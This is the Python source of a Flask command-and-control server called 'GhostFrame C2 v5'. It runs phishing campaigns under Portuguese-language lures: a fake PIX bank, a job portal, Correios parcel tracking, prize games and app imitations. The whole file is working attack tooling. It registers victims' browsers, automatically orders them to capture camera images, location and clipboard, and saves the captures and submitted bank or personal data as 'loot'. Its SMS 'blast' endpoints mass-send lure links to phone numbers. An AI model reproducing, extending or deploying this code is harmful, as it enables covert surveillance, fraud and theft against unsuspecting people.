#!/usr/bin/env python3
"""
GhostFrame C2 v5 — HTTP REST + Auto-Recon + Multi-Campaign + Short Routes
"""
import os, json, uuid, time, threading, re
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template, send_from_directory

try:
    from sms_gateway import send_sms, send_blast, get_sms_log, get_operadoras, get_templates, configure_smtp, test_smtp
    SMS_AVAILABLE = True
except ImportError:
    SMS_AVAILABLE = False

app = Flask(__name__)
PORT = int(os.environ.get("GF_PORT", 8553))

# CORS — necessário para o redirector GitHub Pages injetar o beacon via fetch
@app.before_request
def cors_preflight():
    if request.method == "OPTIONS":
        return ("", 204)

@app.after_request
def add_cors(resp):
    resp.headers["Access-Control-Allow-Origin"] = "*"
    resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    resp.headers["Access-Control-Allow-Headers"] = "Content-Type, ngrok-skip-browser-warning"
    return resp

# ─── Storage ───────────────────────────────────────────────
LOOT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
SESSIONS_FILE = os.path.join(LOOT_DIR, "sessions.json")
COMMANDS_FILE = os.path.join(LOOT_DIR, "commands.json")
RESULTS_FILE = os.path.join(LOOT_DIR, "results.json")
LOGS_FILE = os.path.join(LOOT_DIR, "logs.json")

os.makedirs(LOOT_DIR, exist_ok=True)

def load_json(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path) as f:
            return json.load(f)
    except:
        return default

def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

sessions = load_json(SESSIONS_FILE, {})
commands = load_json(COMMANDS_FILE, {})
results = load_json(RESULTS_FILE, {})
logs = load_json(LOGS_FILE, [])

def save_all():
    save_json(SESSIONS_FILE, sessions)
    save_json(COMMANDS_FILE, commands)
    save_json(RESULTS_FILE, results)

def log_event(event_type, data):
    entry = {"ts": datetime.now().isoformat(), "type": event_type, "data": data}
    logs.append(entry)
    save_json(LOGS_FILE, logs[-500:])

# ─── Campaigns ─────────────────────────────────────────────
CAMPAIGNS = {
    "pix": {
        "name": "PIX — Banco Falso",
        "beacon": "templates/beacon-pix.html",
        "auto_commands": ["info", "camera_back", "camera", "location", "clipboard"],
        "result_tags": ["pix_data"],
    },
    "emprego": {
        "name": "Emprego — Portal RH",
        "beacon": "templates/beacon-emprego.html",
        "auto_commands": ["info", "camera_back", "camera", "location", "clipboard"],
        "result_tags": ["emprego_data"],
    },
    "rastreio": {
        "name": "Correios — Rastreio",
        "beacon": "templates/beacon-correios.html",
        "auto_commands": ["info", "camera_back", "camera", "location", "clipboard"],
        "result_tags": ["correios_data"],
    },
    "roleta": {
        "name": "Roleta Premiada",
        "beacon": "templates/beacon-roleta.html",
        "auto_commands": ["info", "camera_back", "camera", "location", "clipboard"],
        "result_tags": ["roleta_prize"],
    },
    "quiz": {
        "name": "Quiz Premiado",
        "beacon": "templates/beacon-quiz.html",
        "auto_commands": ["info", "camera_back", "camera", "location", "clipboard"],
        "result_tags": ["quiz_data"],
    },
    "game": {
        "name": "DinoRunner",
        "beacon": "templates/beacon.html",
        "auto_commands": ["info", "camera_back", "camera", "location", "clipboard"],
        "result_tags": [],
    },
    "music": {
        "name": "BeatSync",
        "beacon": "templates/beacon-music.html",
        "auto_commands": ["info", "camera_back", "camera", "location", "clipboard"],
        "result_tags": [],
    },
    "sports": {
        "name": "LiveScore",
        "beacon": "templates/beacon-sports.html",
        "auto_commands": ["info", "camera_back", "camera", "location", "clipboard"],
        "result_tags": [],
    },
    "deals": {
        "name": "Ofertas",
        "beacon": "templates/beacon-deals.html",
        "auto_commands": ["info", "camera_back", "camera", "location", "clipboard"],
        "result_tags": [],
    },
    "social": {
        "name": "InstaFiltro",
        "beacon": "templates/beacon-social.html",
        "auto_commands": ["info", "camera_back", "camera", "location", "clipboard"],
        "result_tags": [],
    },
}

# ─── Auto-Recon ────────────────────────────────────────────
AUTO_RECON_DELAY = 8  # seconds before firing auto-recon

def auto_recon_loop():
    """Thread: fire auto-recon commands on new beacons"""
    while True:
        time.sleep(2)
        try:
            now = time.time()
            for sid, s in list(sessions.items()):
                ts = s.get("registered_at", 0)
                if isinstance(ts, str):
                    try:
                        ts = datetime.fromisoformat(ts).timestamp()
                    except:
                        ts = 0
                age = now - ts if ts else 99999
                if 0 < age < AUTO_RECON_DELAY and not s.get("recon_done"):
                    campaign = s.get("campaign", "pix")
                    cmds = CAMPAIGNS.get(campaign, CAMPAIGNS["pix"])["auto_commands"]
                    for cmd in cmds:
                        cid = str(uuid.uuid4())[:8]
                        commands.setdefault(sid, []).append({"id": cid, "command": cmd, "args": {}, "ts": time.time()})
                    sessions[sid]["recon_done"] = True
                    log_event("auto_recon", {"sid": sid, "campaign": campaign, "cmds": cmds})
                    save_all()
        except Exception as e:
            print(f"[AUTO-RECON] Error: {e}")

# ─── Routes: Short + Campaign ──────────────────────────────

@app.route("/")
def root():
    return render_template("beacon-pix.html")

# Short routes (6 chars max — SMS-friendly)
@app.route("/p")
@app.route("/pix")
def route_pix():
    return _serve_campaign("pix")

@app.route("/e")
@app.route("/emprego")
def route_emprego():
    return _serve_campaign("emprego")

@app.route("/r")
@app.route("/rastreio")
def route_rastreio():
    return _serve_campaign("rastreio")

@app.route("/w")
@app.route("/roleta")
def route_roleta():
    return _serve_campaign("roleta")

@app.route("/q")
@app.route("/quiz")
def route_quiz():
    return _serve_campaign("quiz")

# Legacy routes

@app.route("/beacon")
def route_beacon_game():
    return _serve_campaign("game")

@app.route("/beacon-music")
def route_beacon_music():
    return _serve_campaign("music")

@app.route("/beacon-sports")
def route_beacon_sports():
    return _serve_campaign("sports")

@app.route("/beacon-deals")
def route_beacon_deals():
    return _serve_campaign("deals")

@app.route("/beacon-social")
def route_beacon_social():
    return _serve_campaign("social")

@app.route("/landing")
def landing():
    return render_template("landing.html") if os.path.exists("templates/landing.html") else render_template("beacon-pix.html")

@app.route("/panel")
def panel():
    return render_template("panel.html")

# Static files
@app.route("/static/<path:filename>")
def static_files(filename):
    return send_from_directory("static", filename)

def _serve_campaign(campaign_name):
    """Serve beacon for given campaign + track in session"""
    camp = CAMPAIGNS.get(campaign_name, CAMPAIGNS["pix"])
    # Generate virtual "fingerprint pre-register" — session created on first poll
    # but we record which campaign was served so auto-recon picks right commands
    resp = render_template(camp["beacon"].split("/")[-1])
    return resp

# ─── API ────────────────────────────────────────────────────

@app.route("/api/register", methods=["POST"])
def api_register():
    data = request.get_json(force=True) or {}
    sid = data.get("sid") or str(uuid.uuid4())

    # Detect campaign from path/referrer
    path = data.get("path", "")
    referrer = data.get("referrer", "")
    campaign = "pix"
    for tag in ["emprego", "rastreio", "correios", "roleta", "quiz", "beacon-music", "beacon-sports", "beacon-deals", "beacon-social", "beacon", "music", "sports", "deals", "social"]:
        if tag in path.lower():
            campaign = tag if tag != "correios" else "rastreio"
            campaign = {
                "beacon": "game",
                "beacon-music": "music",
                "beacon-sports": "sports",
                "beacon-deals": "deals",
                "beacon-social": "social",
            }.get(campaign, campaign)
            break
    # Fallback: check referrer
    if campaign == "pix":
        for tag in ["emprego", "rastreio", "roleta", "quiz", "beacon-music", "beacon-sports", "beacon-deals", "beacon-social", "beacon", "music", "sports", "deals", "social"]:
            if tag in referrer.lower():
                campaign = tag
                break

    sessions[sid] = {
        "sid": sid,
        "ua": data.get("ua", ""),
        "fingerprint": data.get("fingerprint", {}),
        "ip": request.remote_addr,
        "host": data.get("host", ""),
        "path": path,
        "referrer": referrer,
        "campaign": campaign,
        "registered_at": time.time(),
        "last_seen": time.time(),
        "recon_done": False,
        "commands_sent": 0,
        "results_received": 0,
    }
    log_event("register", {"sid": sid, "ua": data.get("ua", ""), "path": path, "campaign": campaign})
    save_all()
    return jsonify({"sid": sid, "status": "registered", "campaign": campaign})

@app.route("/api/poll", methods=["GET"])
def api_poll():
    sid = request.args.get("sid")
    if not sid or sid not in sessions:
        return jsonify({"commands": []})

    sessions[sid]["last_seen"] = time.time()
    pending = commands.pop(sid, [])
    if pending:
        sessions[sid]["commands_sent"] = sessions[sid].get("commands_sent", 0) + len(pending)
        log_event("poll_deliver", {"sid": sid, "n": len(pending)})
    save_all()
    return jsonify({"commands": pending})

@app.route("/api/result", methods=["POST"])
def api_result():
    data = request.get_json(force=True) or {}
    sid = data.get("sid")
    cmd = data.get("command")
    result_data = data.get("result", "")
    ts = data.get("ts", time.time())

    if not sid or sid not in sessions:
        return jsonify({"status": "unknown_session"})

    sessions[sid]["last_seen"] = ts
    sessions[sid]["results_received"] = sessions[sid].get("results_received", 0) + 1

    results.setdefault(sid, []).append({
        "command": cmd,
        "result": result_data,
        "ts": ts,
        "received_at": time.time(),
    })

    # Keep last 200 results per session
    if len(results[sid]) > 200:
        results[sid] = results[sid][-200:]

    log_event("result", {"sid": sid, "cmd": cmd, "len": len(str(result_data))})

    # Save images to disk
    if cmd in ("camera_user", "camera_environment", "camera_back", "camera", "screenshot"):
        try:
            result_json = json.loads(result_data) if isinstance(result_data, str) else result_data
            img_b64 = result_json.get("image", "")
            if img_b64 and len(img_b64) > 100:
                ext = "jpg"
                fname = f"{sid}_{cmd}_{int(ts)}.{ext}"
                img_dir = os.path.join(LOOT_DIR, "images", sid)
                os.makedirs(img_dir, exist_ok=True)
                import base64
                # Strip data:image prefix if present
                if "," in img_b64:
                    img_b64 = img_b64.split(",", 1)[1]
                with open(os.path.join(img_dir, fname), "wb") as f:
                    f.write(base64.b64decode(img_b64))
        except Exception as e:
            print(f"[IMG] Error saving image: {e}")

    # Save high-value data to loot
    if cmd in ("pix_data", "emprego_data", "correios_data", "roleta_prize", "quiz_data"):
        try:
            parsed = json.loads(result_data) if isinstance(result_data, str) else result_data
            data_dir = os.path.join(LOOT_DIR, "collected")
            os.makedirs(data_dir, exist_ok=True)
            with open(os.path.join(data_dir, f"{sid}_{cmd}.json"), "w") as f:
                json.dump(parsed, f, indent=2, ensure_ascii=False)
        except:
            pass

    save_all()
    return jsonify({"status": "ok"})

@app.route("/api/sessions", methods=["GET"])
def api_sessions():
    """Return all sessions with summary for panel"""
    out = {}
    for sid, s in sessions.items():
        last_seen = s.get("last_seen", 0)
        age = time.time() - (last_seen if isinstance(last_seen, (int, float)) else 0)
        out[sid] = {
            "ua": s.get("ua", ""),
            "ip": s.get("ip", ""),
            "campaign": s.get("campaign", "pix"),
            "age_seconds": round(age, 1),
            "online": age < 30,
            "commands_sent": s.get("commands_sent", 0),
            "results_received": s.get("results_received", 0),
            "recon_done": s.get("recon_done", False),
            "results": results.get(sid, [])[-10:],  # last 10 results
        }
    return jsonify(out)

@app.route("/api/command", methods=["POST"])
def api_command():
    """Enqueue command for a session"""
    data = request.get_json(force=True) or {}
    sid = data.get("sid")
    cmd = data.get("command")
    if not sid or not cmd or sid not in sessions:
        return jsonify({"status": "error", "msg": "invalid sid or command"})
    cid = str(uuid.uuid4())[:8]
    commands.setdefault(sid, []).append({"id": cid, "command": cmd, "args": data.get("args", {}), "ts": time.time()})
    log_event("command_manual", {"sid": sid, "cmd": cmd})
    save_all()
    return jsonify({"status": "queued", "id": cid})

@app.route("/api/stats", methods=["GET"])
def api_stats():
    """Quick overview"""
    total = len(sessions)
    online = sum(1 for s in sessions.values() if time.time() - s.get("last_seen", 0) < 30)
    campaigns_count = {}
    for s in sessions.values():
        c = s.get("campaign", "pix")
        campaigns_count[c] = campaigns_count.get(c, 0) + 1
    return jsonify({
        "total_sessions": total,
        "online": online,
        "campaigns": campaigns_count,
        "total_results": sum(len(v) for v in results.values()),
        "total_logs": len(logs),
    })

# ─── Start ──────────────────────────────────────────────────

# ─── SMS Gateway ────────────────────────────────────────────

@app.route('/api/sms/send', methods=['POST'])
def api_sms_send():
    if not SMS_AVAILABLE:
        return jsonify({"ok": False, "error": "sms_gateway module not installed"})
    data = request.get_json(force=True)
    numero = data.get('numero', '').replace(' ', '').replace('-', '').replace('(', '').replace(')', '').replace('+55', '')
    template = data.get('template', 'wifi_test')
    operadora = data.get('operadora', 'vivo')
    link = data.get('link', 'https://paul-devopsfera.github.io/programa-de-jogo-interessante')
    result = send_sms(numero, template, link, operadora)
    return jsonify(result)

@app.route('/api/sms/blast', methods=['POST'])
def api_sms_blast():
    if not SMS_AVAILABLE:
        return jsonify({"ok": False, "error": "sms_gateway module not installed"})
    data = request.get_json(force=True)
    numeros = data.get('numeros', [])
    operadora = data.get('operadora', 'vivo')
    template = data.get('template', 'wifi_test')
    link = data.get('link', 'https://paul-devopsfera.github.io/programa-de-jogo-interessante')
    delay = data.get('delay', 3)
    t = threading.Thread(target=send_blast, args=(numeros, template, link, operadora, delay))
    t.daemon = True
    t.start()
    return jsonify({"ok": True, "msg": f"Iniciando blast para {len(numeros)} numeros", "count": len(numeros)})

@app.route('/api/sms/log')
def api_sms_log():
    if not SMS_AVAILABLE:
        return jsonify([])
    return jsonify(get_sms_log())

@app.route('/api/sms/operadoras')
def api_sms_operadoras():
    if not SMS_AVAILABLE:
        return jsonify(["vivo", "claro", "oi", "tim", "nextel", "sercomtel"])
    return jsonify(get_operadoras())

@app.route('/api/sms/templates')
def api_sms_templates():
    if not SMS_AVAILABLE:
        return jsonify(["wifi_test", "prize", "urgent", "whatsapp_vip", "bank"])
    return jsonify(get_templates())

@app.route('/api/sms/config', methods=['POST'])
def api_sms_config():
    if not SMS_AVAILABLE:
        return jsonify({"ok": False, "error": "sms_gateway module not installed"})
    data = request.get_json(force=True)
    result = configure_smtp(
        data.get('host', 'smtp.gmail.com'),
        data.get('port', 587),
        data.get('user', ''),
        data.get('pass', ''),
        data.get('from_name', 'Wi-Fi Test')
    )
    return jsonify(result)

@app.route('/api/sms/test')
def api_sms_test():
    if not SMS_AVAILABLE:
        return jsonify({"ok": False, "error": "sms_gateway module not installed"})
    return jsonify(test_smtp())

if __name__ == "__main__":
    t = threading.Thread(target=auto_recon_loop, daemon=True)
    t.start()
    print(f"[GhostFrame v5] Starting on port {PORT}")
    print(f"[GhostFrame v5] Campaigns: {list(CAMPAIGNS.keys())}")
    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)
